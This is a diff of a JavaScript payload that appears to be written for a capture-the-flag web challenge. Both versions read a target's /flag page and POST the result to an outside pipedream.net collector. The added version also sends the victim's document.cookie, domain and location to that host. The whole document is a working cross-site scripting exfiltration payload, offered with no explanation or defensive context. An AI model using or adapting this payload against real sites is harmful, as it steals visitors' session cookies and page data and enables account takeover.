@@ -1,15 +1,39 @@
-fetch("https://hallmark.web.actf.co/flag",{
-            "mode": "no-cors"
-        }).then(function(a) {
-    a.text().then(owo => {
-      const options = {
-      method: "POST",
-      headers,
-      mode: "cors",
-      body: JSON.stringify(owo),
-      }
+  const headers = new Headers()
+headers.append("Content-Type", "application/json")
 
-      fetch("https://eolimcwppmmjo1s.m.pipedream.net", options)
-        
-    })
+let flag = ""
+fetch('https://hallmark.web.actf.co/flag',{
+    "mode": "no-cors"
 })
+  .then(response => {
+    if (response.ok) {
+      return response.text();
+    } else {
+      throw new Error('Error:', response.status);
+    }
+  })
+  .then(data => {
+    console.log(data);
+    flag = data;
+  })
+  .catch(error => {
+    console.error('Error:', error);
+  });
+
+const body = {
+  "test": "Blind",
+  "Domain": document.domain,
+  "cookie": document.cookie,
+  "Location": document.location,
+  "flag":flag
+  
+}
+
+const options = {
+  method: "POST",
+  headers,
+  mode: "cors",
+  body: JSON.stringify(body),
+}
+
+fetch("https://eolimcwppmmjo1s.m.pipedream.net", options)
